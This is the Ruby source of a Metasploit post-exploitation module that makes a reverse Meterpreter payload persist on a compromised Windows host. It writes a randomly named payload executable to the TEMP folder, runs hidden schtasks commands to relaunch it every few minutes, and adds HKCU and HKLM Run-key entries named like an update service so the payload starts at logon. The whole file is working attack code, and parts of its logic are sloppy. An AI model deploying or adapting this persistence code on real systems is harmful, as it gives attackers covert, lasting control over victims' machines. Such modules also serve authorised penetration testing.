##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
require 'msf/core/exploit/exe'

class Metasploit3 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry
  include Exploit::EXE

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Persistent Payload Installer',
      'Description'   => %q{
        This Module will create a boot persistent reverse Meterpreter sessions by
        installing on the target host the payload as a script that will be executed
        at user logon or system startup depending on privilege and selected startup
        method.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Carlos Perez <carlos_perez[at]darkoperator.com>'
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Targets'       => [ [ 'Windows', {} ] ],
      'DefaultTarget' => 0,
      'DisclosureDate'=> "Oct 19 2011"
    ))

    register_options(
      [
        OptInt.new('DELAY', [true, 'Delay in minutes for persistent payload to reconnect.', 2]),
        OptString.new('NAME', [true, 'Name of the scheduled task.', 'update-svc-msf']),
      ], self.class)
  end

  # Exploit Method for when exploit command is issued
  def exploit
    print_status("Running module against #{sysinfo['Computer']}")
    delay = datastore['DELAY']
    name = datastore['NAME']
    execus = datastore['EXE::Custom'].to_s
    host,port = session.session_host, session.session_port
    unless execus.empty?
      exe = get_custom_exe
    else
      exe = generate_payload_exe
    end

    script_on_target = write_script_to_target(exe)

    print_status("Running module against #{sysinfo['Computer']}")
    run_cmd("schtasks /delete /f /tn #{name}")
    run_cmd("schtasks /create /sc minute /mo #{delay} /tn #{name} /tr #{script_on_target}")

    write_to_reg("HKCU", script_on_target, "update-svc")
    write_to_reg("HKLM", script_on_target, "update-svc")

    # exit the module because we failed to write the file on the target host.
    return unless script_on_target

  end


  # Writes script to target host and returns the pathname of the target file or nil if the
  # file could not be written.
  def write_script_to_target(vbs)
    tempdir = datastore['PATH'] || session.sys.config.getenv('TEMP')
    tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"

    begin
      write_file(tempvbs, vbs)
      print_good("Persistent Script written to #{tempvbs}")
      tempvbs = tempvbs.gsub(/\\/, '\\')      # Escape windows pathname separators.
    rescue
      print_error("Could not write the payload on the target hosts.")
      # return nil since we could not write the file on the target host.
      tempvbs = nil
    end
    return tempvbs
  end

  # Executes script on target and returns true if it was successfully started
  def target_exec(script_on_target)
    execsuccess = true
    print_status("Executing script #{script_on_target}")
    # error handling for process.execute() can throw a RequestError in send_request.
    begin
      unless datastore['EXE::Custom']
        session.shell_command_token(script_on_target)
      else
        session.shell_command_token("cscript \"#{script_on_target}\"")
      end
    rescue
      print_error("Failed to execute payload on target host.")
      execsuccess = false
    end
    return execsuccess
  end

  # Installs payload in to the registry HKLM or HKCU
  def write_to_reg(key, script_on_target, registry_value)
    nam = registry_value || Rex::Text.rand_text_alpha(rand(8)+8)
    key_path = "#{key.to_s}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"

    print_status("Installing into autorun as #{key_path}\\#{nam}")
    if key && registry_setvaldata(key_path, nam, script_on_target, "REG_SZ")
      print_good("Installed into autorun as #{key_path}\\#{nam}")
      return true
    else
      print_error("Failed to make entry in the registry for persistence in #{key_path}\\#{nam}")
    end

    false
  end

  ##
  # The cmd run function
  ##

  def run_cmd(cmd)
    process = session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
    res = ""
    while (d = process.channel.read)
      break if d == ""
      res << d
    end
    process.channel.close
    process.close
    return res
  end


end
